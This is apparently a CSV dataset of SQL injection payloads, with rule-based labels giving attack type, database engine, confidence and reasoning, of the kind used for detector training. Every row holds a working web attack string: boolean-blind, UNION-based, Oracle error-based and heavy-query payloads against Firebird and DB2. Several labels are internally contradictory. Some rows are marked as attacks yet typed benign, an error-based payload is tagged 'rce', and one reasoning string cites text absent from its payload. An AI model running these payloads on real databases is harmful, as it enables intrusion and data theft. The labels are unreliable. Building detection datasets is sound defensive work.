row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
7050,"1' and elt ( 4249 = 4249,7259 ) and 'nsbj' like 'nsbj",1,,boolean_blind,generic,0.95,like ' detected — boolean_blind injection (priority 8) on generic,rule-based
7051,"1%"" ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ""%"" = """,1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
7052,1%' and 2006 = 2006,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7053,"-6200' ) ) as jjpz where 4490 = 4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7054,"-6520%"" ) order by 1#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7055,-9673 ) or 8571 = 8571--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7056,1'|| ( select 'vasx' where 4770 = 4770 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||',1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
7057,1 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) -- slje,1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
7058,1 ) as bzuh where 8041 = 8041 and 6307 = 9200#,1,,boolean_blind,generic,0.95,8041 = 8041 and detected — boolean_blind injection (priority 8) on generic,rule-based
7059,"-9152"" ) ) as avga where 3825 = 3825 order by 1#",1,,boolean_blind,generic,0.95,3825 = 3825 or detected — boolean_blind injection (priority 8) on generic,rule-based
7060,"1"" ) as pxdq where 2236 = 2236 and 2006 = 2006",1,,boolean_blind,generic,0.95,2236 = 2236 and detected — boolean_blind injection (priority 8) on generic,rule-based
7061,"1"" ) ) as pqbs where 4409 = 4409",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7062,"-7678 ) ) ) union all select 2622,2622,2622,2622,2622,2622,2622,2622--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7063,"-9015%"" ) union all select 6948,6948--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7064,"1%' ) ) union all select null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7065,"1 ) where 1270 = 1270 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
7066,"1"" or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
